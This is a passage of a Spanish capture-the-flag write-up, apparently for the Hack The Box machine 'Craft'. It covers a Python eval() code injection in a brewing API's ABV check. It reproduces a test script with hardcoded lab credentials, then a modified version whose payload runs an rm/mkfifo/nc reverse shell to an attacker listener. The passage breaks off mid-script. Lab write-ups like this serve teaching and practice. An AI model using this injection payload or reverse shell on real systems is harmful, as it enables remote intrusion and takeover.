&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; &amp;gt; 1&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]):&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ABV must be a decimal value less than 1.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html&#34;&gt;&lt;strong&gt;Python Code Injection&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ademas de eso encontramos un archivo test.py que contiene un usuario y contraseña para generar un token, para luego crear un &amp;lsquo;brew&amp;rsquo; insatisfactorio y satisfactoriamente. El primero contiene un numero con punto decimal mayor a 1 que debe de ser rechazado por la API. El segundo un numero menor a 1 con punto decimal que debe de ser aceptado por la API.&lt;/p&gt;
&lt;p&gt;Archivo test.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/auth/login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;auth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;json_response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;json_response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# make sure token is valid&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# create a sample brew with bogus ABV... should fail.&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Create bogus ABV brew&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;15.0&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;brewer&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/brew/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;c1&#34;&gt;# create a sample brew with real ABV... should succeed.&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Create real ABV brew&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0.15&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;brewer&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;style&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dumps&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/brew/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;json_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Prueba del archivo test.py:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-07-31%2001.37.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;rce---craft-api&#34;&gt;RCE - Craft API&lt;/h2&gt;
&lt;p&gt;Para poder ejecutar comandos y obtener una shell inversa a travez de la vulnerabilidad que encontramos en el codigo del repositorio vamos a modificar el archivo &lt;code&gt;test.py&lt;/code&gt;, agregandole un comando que va a ser ejecutado por la funcion &lt;strong&gt;eval()&lt;/strong&gt;. Agregamos nuestra shell inversa &amp;ldquo;escapando&amp;rdquo; todas los backslash que se encuentran para no tener ningun problema al ejecutarse. Y Ponemos a la escucha nuestra maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;json&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/auth/login&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;auth&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dinesh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;4aUh0A8PbVJxgd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;json_response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;json&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;loads&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;json_response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;X-Craft-API-Token&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;application/json&amp;#39;&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# make sure token is valid&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.craft.htb/api/auth/check&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.184 8878 &amp;gt;\/tmp\/f&amp;#39;).read()&amp;#34;&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# create a sample brew with real ABV... should succeed.&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Create real ABV brew&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{}&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;abv&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;brew_dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;bullshit&amp;#39;&lt;/span&gt;
